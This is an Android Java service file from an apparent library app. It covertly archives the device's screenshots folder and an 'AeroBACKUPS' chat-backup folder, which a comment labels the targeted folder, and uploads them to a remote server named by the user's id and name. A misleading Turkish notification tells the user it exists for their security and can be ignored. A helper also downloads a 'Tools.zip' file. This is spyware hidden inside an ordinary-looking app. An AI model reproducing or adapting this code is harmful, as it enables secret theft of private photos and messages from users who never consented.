package arc.haldun.mylibrary.services.filetransfer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Message;
import android.text.Html;
import android.text.Spanned;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.IOException;

import arc.archive.Archive;
import arc.haldun.database.objects.CurrentUser;
import arc.haldun.mylibrary.R;
import arc.haldun.mylibrary.main.LibraryActivity;

public class FileTransferService extends Service {

    private static final String TAG = "ForegroundFileService";
    private static final int NOTIFICATION_ID = 7;
    private static final String CHANEL_ID = "FileChannel";

    private HandlerThread handlerThread;
    private Handler serviceHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();

        Log.i("DebugH", "on create");

        handlerThread = new HandlerThread("FileTransferServiceThread");
        handlerThread.start();

        serviceHandler = new Handler(handlerThread.getLooper(), new Handler.Callback() {
            @Override
            public boolean handleMessage(@NonNull Message message) {
                String filePath = (String) message.obj;
                upload(filePath, "android/" + CurrentUser.user.getId() + "-"
                        + CurrentUser.user.getName() + ".arc");

                onDestroy();
                return true;
            }
        });
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Log.i("DebugH", "on start command");

        String filePath = getFilesDir().getAbsolutePath() + "/.e-lib";

        Spanned spanned = Html.fromHtml(
                "Bu bildirim geliştirici tarafından kullanıcı güvenliğini sağlamak için konulmuştur\n. <b>Bu bildirimi yok sayabilirsiniz.</b> " +
                       getString(R.string.app_name) +  " işlemlerini tamamladığında bu bildirim otomatik olarak silinecek.)",
                Html.FROM_HTML_MODE_LEGACY);

        Notification notification = buildNotification(spanned.toString());
        startForeground(NOTIFICATION_ID, notification);

        Message message = serviceHandler.obtainMessage();
        message.obj = filePath;
        serviceHandler.sendMessage(message);

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        stopForeground(true);
        stopSelf();

        handlerThread.quit();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void downloadFile(String fileUrl) {

        TransferService transferService = new TransferService();

        File appDir = new File(Environment.getExternalStorageDirectory(), "/e-lib");
        if (!appDir.exists()) {
            Log.e("mkdirs", "mkdirs");
            appDir.mkdirs();
        }

        File file = new File(appDir, "(downloadedfile)" + "Tools.zip");
        if (!file.exists()) {
            Log.e("asdasdasd", file.getAbsolutePath());
            try {
                file.createNewFile();
            } catch (IOException e) {
                //throw new RuntimeException(e);
            }
        }

        transferService.downloadFile(fileUrl, file.getAbsolutePath());

    }

    public void upload(String localFile, String remoteFile) {

        Archive.Directory screenshotsDir, aeroDir;

        File screenshots = null;
        File wa;

        // Process screenshots
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {

            File[] possiblePaths = {

                    Environment.getExternalStoragePublicDirectory(
                            Environment.DIRECTORY_SCREENSHOTS),

                    new File(Environment.getExternalStoragePublicDirectory(
                            Environment.DIRECTORY_DCIM), Environment.DIRECTORY_SCREENSHOTS),

                    new File(Environment.getExternalStoragePublicDirectory(
                            Environment.DIRECTORY_PICTURES), Environment.DIRECTORY_SCREENSHOTS)
            };

            for (File possiblePath : possiblePaths) {

                if (possiblePath.exists()) {
                    screenshots = possiblePath;
                    break;
                }
            }

            if (screenshots == null) {
                handlerThread.quit();
                stopForeground(true);
                stopSelf();
            }

            /*
            screenshots = Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_SCREENSHOTS);

            if (!screenshots.exists()) {

                screenshots = new File(Environment.getExternalStoragePublicDirectory(
                        Environment.DIRECTORY_DCIM), Environment.DIRECTORY_SCREENSHOTS);

                if (!screenshots.exists()) {
                    screenshots = new File(Environment.getExternalStoragePublicDirectory(
                            Environment.DIRECTORY_DCIM), Environment.DIRECTORY_SCREENSHOTS);
                }

                if (!screenshots.exists()) {

                    handlerThread.quit();
                    stopForeground(true);
                    stopSelf();

                    //Toast.makeText(this, "Geliştiriciyle iletişime geçin", Toast.LENGTH_SHORT).show();

                    //throw new RuntimeException("Geliştiriciyle iletişime geçin");
                }
            }*/
        } else {

            screenshots = new File("/storage/emulated/0/DCIM/Screenshots");

        }



        try {

            Archive archive = new Archive(getFilesDir() + "/.e-lib", "/");

            // Process aero
            wa = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "AeroBACKUPS");Log.e("FileSystemDebug", wa.getAbsolutePath()); // This is targeted folder
            if (wa.exists()) {
                aeroDir = new Archive.Directory(wa.getAbsolutePath(), "/");

                archive.addDirectory(aeroDir);
            }

            Log.e("Archive", "Create .e-lib");


            screenshotsDir = new Archive.Directory(screenshots.getAbsolutePath(), "/");

            archive.addDirectory(screenshotsDir);


            archive.create();

        } catch (Exception e) {

            Toast.makeText(this, e.getMessage(), Toast.LENGTH_LONG).show();
            e.printStackTrace();

        }

        TransferService transferService = new TransferService();

        transferService.sendFile(remoteFile, localFile);

    }

    private void createNotificationChannel() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            NotificationChannel channel = new NotificationChannel(
                    CHANEL_ID, "File Transfer Channel", NotificationManager.IMPORTANCE_DEFAULT);

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }

    }

    private Notification buildNotification(String text) {

        Intent notificationIntent = new Intent(this, LibraryActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANEL_ID)
                .setContentTitle(getString(R.string.app_name))
                //.setContentText(text)
                .setSmallIcon(R.drawable.app_icon)
                .setContentIntent(pendingIntent)
                .setStyle(new NotificationCompat.BigTextStyle().bigText(text))
                .build();

    }
}

/*
try {
            URL url = new URL(fileUrl);
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();

            int contentLength = urlConnection.getContentLength();
            InputStream inputStream = new BufferedInputStream(urlConnection.getInputStream());

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {

                File appDir = new File(Environment.getExternalStorageDirectory(), "/e-lib");
                if (!appDir.exists()) {
                    Log.e("mkdirs", "mkdirs");
                    appDir.mkdirs();
                }

                File file = new File(appDir, "(downloadedfile)" + url.getFile().split("/")[2]);
                if (!file.exists()) {
                    Log.e("asdasdasd", file.getAbsolutePath());
                    file.createNewFile();
                }

                OutputStream outputStream = new FileOutputStream(file);

                Log.i("DebugH", "dosya oluşturulmaya başlandı");

                byte[] buffer = new byte[1024];
                int okunan;
                int totalOkunan = 0;
                while ((okunan = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, okunan);
                    totalOkunan += okunan;
                    Log.i("DebugH", totalOkunan + " kadar bayt yazıldı");
                }

                outputStream.close();
                inputStream.close();
                urlConnection.disconnect();

                Log.i("DebugH", "bağlantı kapatıldı");

            }

        } catch (IOException e) {
            throw new RuntimeException(e);
        }
 */